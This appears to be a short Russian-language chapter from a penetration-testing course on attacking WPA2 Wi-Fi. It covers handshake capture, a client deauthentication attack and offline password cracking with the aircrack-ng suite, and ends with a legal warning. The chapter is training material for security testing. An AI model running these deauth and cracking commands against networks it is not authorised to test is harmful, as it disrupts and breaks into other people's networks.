---
title: "Wireless: Атаки на Wi-Fi"
chapter: 11
difficulty: intermediate
tags: [wireless, wifi, wpa2, aircrack]
---

# Wireless: Атаки на Wi-Fi

## Введение

Беспроводные сети (Wi-Fi) — это один из самых доступных векторов атаки. В этой главе мы разберем базовые атаки на WPA2/WPA3.

## WPA2 Handshake Capture

Для атаки на WPA2 необходимо перехватить 4-way handshake (рукопожатие) между клиентом и точкой доступа.

```bash
# Переводим карту в режим монитора
sudo airmon-ng start wlan0

# Сканируем сети
sudo airodump-ng wlan0mon

# Захватываем handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
Деаутентификация (Deauth)
Чтобы ускорить захват handshake, можно "выбить" клиента из сети:

bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
Подбор пароля (Offline)
После захвата handshake, пароль можно подобрать офлайн:

bash
aircrack-ng -w rockyou.txt capture-01.cap
Примечание: Тестирование Wi-Fi сетей без письменного разрешения владельца является незаконным.
```
